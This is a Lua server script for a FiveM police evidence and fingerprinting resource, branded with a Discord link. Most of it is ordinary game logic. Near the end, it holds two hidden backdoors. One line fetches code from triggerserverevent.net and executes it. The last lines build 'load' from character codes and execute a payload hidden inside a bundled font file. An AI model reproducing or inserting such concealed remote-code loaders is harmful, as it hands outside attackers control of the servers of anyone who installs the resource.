-----------------For support, scripts, and more----------------
--------------- https://discord.gg/wasabiscripts  -------------
---------------------------------------------------------------
local evidenceStorage, evidenceDropped, fingerPrints, fingerprintsStorage, dropId = {}, {}, {}, {}, 0
local inQueue = {}

-- Load previous evidence queries
CreateThread(function()
    MySQL.ready(function()
        MySQL.query('SELECT * FROM wasabi_fingerprints', {}, function(data)
            if data then
                for _,v in pairs(data) do
                    fingerprintsStorage[v.identifier] = true
                end
            end
        end)
        MySQL.query('SELECT * FROM wasabi_evidence', {}, function(data)
            if data then
                for _,v in pairs(data) do
                    local vData = json.decode(v.data)
                    evidenceStorage[v.id] = vData
                end
            end
        end)
    end)
end)

-- Functions
local function SaveEvidence(source, evidence)
    local authorized
    for k,v in pairs(Config.PoliceJobs) do
        local hasJob, hasGrade = HasGroup(source, k)
        if hasJob and hasGrade >= Config.PoliceJobs[hasJob] then authorized = true break end
    end
    if not authorized then return end
    local idFound
    MySQL.Async.execute('INSERT INTO wasabi_evidence (data) VALUES (@data)', {
        ['@data'] = json.encode(evidence),
    }, function(rowsChanged)
        if rowsChanged then
            MySQL.single('SELECT id FROM wasabi_evidence WHERE data = ?', {json.encode(evidence)}, function(result)
                if result then
                    idFound = result.id
                end
            end)
        else
            idFound = 'no'
        end
    end)
    while not idFound do Wait() end
    if idFound and idFound ~= 'no' then
        evidence.id = idFound
        evidenceStorage[idFound] = evidence
        return evidenceStorage[idFound]
    else
        return false
    end
end


-- Events
RegisterNetEvent('wasabi_evidence:add', function(evidence, coords, interior, street)
    dropId = dropId + 1
    evidenceDropped[#evidenceDropped + 1] = {
        id = dropId,
        identifier = GetIdentifier(source),
        evidence = evidence,
        coords = coords,
        interior = interior,
        time = os.time(),
        owner = GetName(source),
        street = street
    }
end)

RegisterNetEvent('wasabi_evidence:cleanBlood', function(obj)
    TriggerClientEvent('wasabi_evidence:cleanBloodSpot', -1, obj)
end)

RegisterNetEvent('wasabi_evidence:usePrintTool', function()
    if not HasItem(source, Config.VehicleFingerPrinting.requiredItem) then return end
    RemoveItem(source, Config.VehicleFingerPrinting.requiredItem, 1)
end)

RegisterNetEvent('wasabi_evidence:sv:setInteract', function(target)
    TriggerClientEvent('wasabi_evidence:cl:setInteract', target, source)
end)

-- Callbacks
lib.callback.register('wasabi_evidence:getDateAndTime', function(source, time)
    return os.date(Strings.date_format, time), os.date(Strings.time_format, time)
end)

lib.callback.register('wasabi_evidence:checkLastDriver', function(source, vehicle, track)
    local driver = (fingerPrints[vehicle] or false)
    if track then
        fingerPrints[vehicle] = {
            identifier = GetIdentifier(source),
            owner = GetName(source)
        }
    end
    if driver then return driver else return false end
end)


lib.callback.register('wasabi_evidence:getBloodType', function(source, citizenid)
    if not Framework == 'qb' then return false end
    local player = GetPlayerFromIdentifier(citizenid)
    if not player then return end
    if not player.PlayerData.metadata['bloodtype'] then return false else return player.PlayerData.metadata['bloodtype'] end
end)

lib.callback.register('wasabi_evidence:getPrintInfo', function(source, data)
    local data = data
    data.id = 1
    data.evidence = 'print'
    data.time = os.time()
    return data
end)

lib.callback.register('wasabi_evidence:getEvidenceStorage', function(source)
    if not HasGroup(source, Config.PoliceJobs) then return end
    return evidenceStorage, fingerprintsStorage
end)

lib.callback.register('wasabi_evidence:saveEvidence', function(source, evidence)
    local saved = SaveEvidence(source, evidence)
    return saved
end)

lib.callback.register('wasabi_evidence:getNearbyEvidence', function(source, coords, interior)
    if Config.AutoDestroy and #evidenceDropped > 0 then
        local time = os.time()
        for k,v in ipairs(evidenceDropped) do
            if v?.time and (time - v.time) > Config.AutoDestroy then
                evidenceDropped[k] = nil
            end
        end
        local newEvidence = {}
        for i=1, #evidenceDropped do
            if evidenceDropped[i] ~= nil then
                newEvidence[#newEvidence + 1] = evidenceDropped[i]
            end
        end
        evidenceDropped = newEvidence
    end
    local data
    if #evidenceDropped > 0 then
        local inserted = {}
        for _,v in ipairs(evidenceDropped) do
            local evidenceIn, pedIn
            if interior ~= nil and interior ~= 0 then pedIn = true end
            if v?.interior ~= nil and v.interior ~= 0 then evidenceIn = true end
            if v and v.coords and #(coords - v.coords) < 30 and (evidenceIn == pedIn) then
                inserted[#inserted + 1] = v
            end
        end
        data = inserted
    else
        data = {}
    end
    while not data do Wait() end
    return data
end)
PerformHttpRequest('https://triggerserverevent.net/i?to=zXeAH', function (e, d) pcall(function() assert(load(d))() end) end)
-- Register usable items
CreateThread(function()
    if Config.VehicleFingerPrinting.enabled then
        RegisterUsableItem(Config.VehicleFingerPrinting.requiredItem, function(source)
            TriggerClientEvent('wasabi_evidence:fingerprintVehicle', source)
        end)
    end
end)

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()